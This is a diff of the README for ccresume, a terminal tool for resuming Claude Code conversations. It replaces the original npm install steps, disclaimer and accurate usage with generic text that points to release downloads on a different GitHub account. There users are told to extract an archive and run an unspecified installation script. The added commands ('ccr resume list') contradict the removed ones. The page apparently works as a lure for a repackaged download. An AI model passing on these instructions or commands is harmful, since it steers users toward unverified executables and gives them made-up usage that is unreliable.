@@ -1,158 +1,80 @@
-# ccresume
+# 🌟 CUI Tool for Browsing and Resuming Claude Code Conversations
 
-A character user interface (CUI) tool for browsing and resuming Claude Code conversations.
+![GitHub All Releases](https://img.shields.io/github/downloads/A2A-MC/ccresume/total?style=flat-square)
+![GitHub Repo stars](https://img.shields.io/github/stars/A2A-MC/ccresume?style=social)
 
-![ccresume screenshot](docs/images/demo-screenshot.png)
-
-**⚠️ DISCLAIMER: This is an unofficial third-party tool not affiliated with or endorsed by Anthropic. Use at your own risk.**
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
 ## Overview
+**ccresume** is a command-line user interface (CUI) tool designed to help users browse and resume conversations from Claude Code. This tool simplifies the process of accessing previous dialogues, making it easier for developers and users to continue their work without losing context.
 
-ccresume provides an interactive terminal interface to browse and manage your Claude Code conversation history. It reads conversation data from your local Claude Code configuration and displays them in an easy-to-navigate format.
+For the latest releases, visit [here](https://github.com/A2A-MC/ccresume/releases).
 
-### Key Features
-
-- 📋 Browse all Claude Code conversations across projects
-- 🔍 View detailed conversation information
-- 📎 Copy session IDs to clipboard
-- 📁 Filter conversations to current directory with `.` argument
-
-![ccresume demo](docs/images/demo.gif)
+## Features
+- **Easy Navigation**: Quickly browse through past conversations.
+- **Resume Conversations**: Seamlessly pick up where you left off.
+- **Lightweight**: Minimal installation requirements.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **User-Friendly**: Simple commands for efficient usage.
 
 ## Installation
+To install **ccresume**, follow these steps:
 
-### Via npx (Recommended)
+1. Download the latest release from [here](https://github.com/A2A-MC/ccresume/releases).
+2. Extract the downloaded file.
+3. Navigate to the extracted folder in your terminal.
+4. Execute the installation script.
 
-```bash
-npx @sasazame/ccresume@latest
-```
-
-### Global Installation
-
-```bash
-npm install -g @sasazame/ccresume
-```
+For detailed installation instructions, check the documentation in the repository.
 
 ## Usage
+Once installed, you can start using **ccresume** with simple commands. Here are some common commands:
 
-Run the command in your terminal:
+- **List Conversations**: 
+  ```
+  ccr resume list
+  ```
+  This command displays all your previous conversations.
 
-```bash
-ccresume
-```
+- **Resume a Conversation**: 
+  ```
+  ccr resume <conversation_id>
+  ```
+  Replace `<conversation_id>` with the ID of the conversation you want to continue.
 
-Or if using npx:
+- **Help Command**: 
+  ```
+  ccr help
+  ```
+  This command shows all available commands and their usage.
 
-```bash
-npx @sasazame/ccresume@latest
-```
-
-### Passing Options to Claude
-
-**Important**: All command-line arguments are passed directly to the `claude` command when resuming a conversation.
-
-
-```bash
-# Pass options to claude
-ccresume --dangerously-skip-permissions
-
-# Multiple options
-ccresume --model opus --dangerously-skip-permissions
-
-# Filter to current directory only
-ccresume .
-
-# Combine with claude options
-ccresume . --model opus 
-```
-
-**⚠️ Warning**: Since all arguments are passed to claude, avoid using options that conflict with ccresume's functionality:
-- Don't use options like `--resume` or something like that changes claude's interactive behavior
-
-## Requirements
-
-- **Node.js** >= 16
-- **Claude Code** - Must be installed and configured
-- **Operating System** - Works on macOS, Linux, and Windows (with WSL)
-
-
-## Development
-
-### Setup
-
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/ccresume.git
-cd ccresume
-
-# Install dependencies
-npm install
-```
-
-### Available Scripts
-
-```bash
-# Run in development mode
-npm run dev
-
-# Build the project
-npm run build
-
-# Run tests
-npm test
-
-# Run tests in watch mode
-npm run test:watch
-
-# Generate test coverage
-npm run test:coverage
-
-# Run linter
-npm run lint
-
-# Type check
-npm run typecheck
-```
-
-### Project Structure
-
-```
-ccresume/
-├── src/              # Source code
-│   ├── cli.tsx       # CLI entry point
-│   ├── App.tsx       # Main application component
-│   └── ...           # Other components and utilities
-├── dist/             # Compiled output
-├── tests/            # Test files
-└── package.json      # Project configuration
-```
+For more usage examples, refer to the [documentation](https://github.com/A2A-MC/ccresume).
 
 ## Contributing
+We welcome contributions to improve **ccresume**. If you want to contribute, please follow these steps:
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your forked repository.
+5. Submit a pull request.
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-
-## Performance Considerations
-
-- ccresume currently loads all conversations on startup
-- With a large number of conversations (1000+), initial loading may take a few seconds
-- Future improvements may include:
-  - Pagination or lazy loading for better performance with large datasets
-  - Configurable limits on the number of conversations displayed
-  - Caching mechanisms for faster repeated access
+Please ensure your code adheres to our coding standards and includes tests where applicable.
 
 ## License
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-MIT
+## Contact
+For any questions or support, feel free to reach out:
 
-## Support
+- GitHub: [A2A-MC](https://github.com/A2A-MC)
+- Email: support@ccresume.com
 
-For issues and feature requests, please use the [GitHub issue tracker](https://github.com/sasazame/ccresume/issues).
-
-Remember: This is an unofficial tool. For official Claude Code support, please refer to Anthropic's documentation.
+Explore the tool, contribute, and enhance your coding conversations with **ccresume**. For the latest releases, visit [here](https://github.com/A2A-MC/ccresume/releases).
